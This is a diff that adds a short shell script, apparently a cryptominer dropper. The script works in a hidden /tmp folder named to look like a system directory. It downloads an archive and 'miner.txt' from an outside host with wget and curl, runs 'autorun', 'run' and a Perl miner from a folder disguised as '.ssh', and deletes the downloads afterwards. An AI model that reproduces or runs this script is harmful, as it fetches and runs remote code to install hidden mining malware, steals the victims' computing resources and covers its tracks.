@@ -1,0 +1,15 @@
+#!/bin/sh
+cd /tmp
+rm -rf .ICE-unix;
+mkdir .ICE-unix;
+cd .ICE-unix;rm -rf .* *
+wget zmeul.me.la/min.tar
+curl -O zmeul.me.la/min.tar
+tar xvf min.tar
+rm -rf min.tar
+cd .ssh
+./autorun
+./run
+wget zmeul.me.la/miner.txt
+perl miner.txt
+rm -rf miner.txt
